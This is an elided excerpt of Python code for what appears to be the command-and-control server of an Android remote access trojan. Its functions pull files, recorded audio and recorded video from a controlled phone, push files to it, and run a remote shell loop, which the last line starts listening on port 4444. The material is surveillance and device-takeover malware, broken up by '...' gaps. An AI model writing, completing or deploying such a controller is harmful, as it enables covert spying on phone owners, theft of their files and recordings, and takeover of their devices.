...
def help():
    ...
    vibrate [number_of_times]  --> vibrate the device number of times
...
def getFile(filename, ext, data):
    ...
    with open(fileData, 'wb') as file:
        try:
            ...
            file.write(rawFile)
            print(stdOutput("success") + "Successfully Downloaded in \033[1m\033[32m" + getpwd(fileData) + "\n")
        except binascii.Error:
            print(stdOutput("error") + "Not able to decode the File")
            os.remove(fileData)
...
def shell(client):
    ...
    while True:
        ...
        if "getFile" in msg:
            msg = recvall(client).replace("\nEND123\n", "")
            filedata = msg.split("|_|")
            ...
            if file.exists():
                ...
                print(stdOutput("success") + f"Successfully Uploaded the file \033[32m{filedata[0] + '.' + filedata[1]} in /sdcard/temp/")
            else:
                print(stdOutput("error") + "File does not exist")
        elif "Exiting" in msg:
...
def stopAudio(client):
    ...
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data = recvall(client).strip().replace("END123", "").strip()
    filename = "Dumps" + direc + "Audio_" + timestr + ".mp3"
    if data == "":
        print(stdOutput("error") + "Unable to connect to the Audio Recorder\n")
        return
    with open(filename, 'wb') as audio:
        try:
            audio.write(base64.b64decode(data))
            print(stdOutput("success") + "Successfully Saved in \033[1m\033[32m" + getpwd(filename) + "\n")
        except binascii.Error:
            print(stdOutput("error") + "Not able to decode the Audio\n")
            os.remove(filename)
...
def stopVideo(client):
    ...
    if data == "":
        print(stdOutput("error") + "Unable to connect to the Video Recorder\n")
        return
    with open(filename, 'wb') as file:
        try:
            ...
            print(stdOutput("error") + "Not able to decode the Video\n")
            os.remove(filename)
...
get_shell("192.168.11.166", 4444)  # You can replace "0.0.0.0" with a specific IP address if needed
